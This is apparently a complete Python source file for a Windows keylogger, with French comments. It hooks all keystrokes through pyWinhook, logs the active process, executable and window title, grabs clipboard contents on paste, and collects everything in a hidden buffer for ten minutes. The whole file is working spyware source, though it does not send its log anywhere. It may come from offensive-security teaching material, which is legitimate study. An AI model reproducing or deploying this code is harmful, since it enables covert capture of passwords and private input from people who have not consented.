from ctypes import byref, create_string_buffer, c_ulong, windll
from io import StringIO
import os
import pythoncom
import pyWinhook as pyHook
import sys
import time
import win32clipboard

TIMEOUT = 60*10

class KeyLogger:
    def __init__(self):
        self.current_window = None

    def get_current_process(self):
        # Handle de la fenêtre active
        hwnd = windll.user32.GetForegroundWindow()
        pid = c_ulong(0)
        # Récupère l’ID du processus de la fenêtre
        windll.user32.GetWindowThreadProcessId(hwnd, byref(pid))
        process_id = f'{pid.value}'

        # Nom de l’exécutable
        executable = create_string_buffer(512)
        h_process = windll.kernel32.OpenProcess(0x400 | 0x10, False, pid)
        windll.psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

        # Titre de la fenêtre
        window_title = create_string_buffer(512)
        windll.user32.GetWindowTextA(hwnd, byref(window_title), 512)
        try:
            self.current_window = window_title.value.decode()
        except UnicodeDecodeError as e:
            print(f'{e}: window name unknown')

        print('\n', process_id, executable.value.decode(), self.current_window)

        # Libération des handles
        windll.kernel32.CloseHandle(hwnd)
        windll.kernel32.CloseHandle(h_process)

    def mykeystroke(self, event):
        # Si on change de fenêtre
        if event.WindowName != self.current_window:
            self.get_current_process()

        # Si c’est un caractère imprimable
        if 32 < event.Ascii < 127:
            print(chr(event.Ascii), end='')
        else:
            # Si c’est un collage
            if event.Key == 'V':
                win32clipboard.OpenClipboard()
                value = win32clipboard.GetClipboardData()
                win32clipboard.CloseClipboard()
                print(f'[PASTE] - {value}')
            else:
                print(f'{event.Key}')

        # Retourne True pour continuer la chaîne de hook
        return True

def run():
    save_stdout = sys.stdout
    sys.stdout = StringIO()

    kl = KeyLogger()

    # Création du hook
    hm = pyHook.HookManager()
    hm.KeyDown = kl.mykeystroke
    hm.HookKeyboard()

    # Boucle jusqu’au timeout
    start_time = time.time()
    while time.time() - start_time < TIMEOUT:
        pythoncom.PumpWaitingMessages()

    log = sys.stdout.getvalue()
    sys.stdout = save_stdout
    return log

if __name__ == '__main__':
    print(run())
    print('done.')
